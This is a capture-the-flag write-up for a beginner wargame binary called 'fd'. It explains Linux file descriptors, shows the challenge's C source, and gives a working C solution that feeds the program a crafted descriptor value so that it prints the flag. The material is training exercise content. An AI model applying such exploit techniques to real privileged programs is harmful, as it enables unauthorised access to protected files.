fd (file descriptor) is the numeric value representing an open file in linux, similarly to handle values in windows, it's used to work with files and other interfaces and each file has a unique file descriptor that identifies it.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;
        printf("argv[1]: %s, fd: %d\n", argv[1], fd);
	int len = 0;
	len = read(fd, buf, 32);
        printf("len: %d, buf: %s\n", len, buf);
	if(!strcmp("LETMEWIN\n", buf)){
		printf("good job :)\n");
		system("/bin/cat flag");
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}

The program gets 1 parameter which is an arbitrary file descriptor value + 0x1234 (to make fd=3 we will need to pass 3 + 0x1234 to the program). The program then uses that open file descriptor to read up to 32 bytes from the file and compare them to the string "LETMEWIN\n". To do that I Created the following C script:

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

int main() {
    const char *filename = "/tmp/fd_file";
    const char *content = "LETMEWIN\n";
    const char *program = "/home/fd/fd";
    char fd_str[16]; 
    int fd;

    fd = open(filename, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd < 0) {
        perror("Failed to create the file");
        exit(EXIT_FAILURE);
    }
    if (write(fd, content, strlen(content)) != (ssize_t)strlen(content)) {
        perror("Failed to write to the file");
        close(fd);
        exit(EXIT_FAILURE);
    }
    printf("File created and written to: %s\n", filename);
    printf("File descriptor: %d\n", fd);
    close(fd);

    fd = open(filename, O_RDONLY);
    if (fd < 0) {
        perror("Failed to reopen the file");
        exit(EXIT_FAILURE);
    }
    printf("File reopened: %s\n", filename);
    printf("Reopened file descriptor: %d\n", fd);

    int modified_fd = fd + 0x1234;
    printf("Modified file descriptor (original + 0x1234): %d\n", modified_fd);

    snprintf(fd_str, sizeof(fd_str), "%d", modified_fd);
    printf("Modified file descriptor as string: %s\n", fd_str);

    printf("Executing program: %s with argument: %s\n", program, fd_str);
    if (execl(program, program, fd_str, NULL) < 0) {
        perror("Failed to execute the program");
        close(fd);
        exit(EXIT_FAILURE);
    }
    close(fd);
    return 0;
}

There are 5 main parts to the script:
1) Create an accessible file in /tmp directory
2) Write "LETMEWIN\n" into the file
3) Close the file and make sure a handle to the file is open while calling fd
4) add 0x1234 to the fd value and convert to string
5) call fd using the stringified file descriptor

I compiled the script in /tmp and because we need to trigger it from /home/fd (relative path) I used the command /tmp/./fd_writeup

![[asdasdasdsa.png]]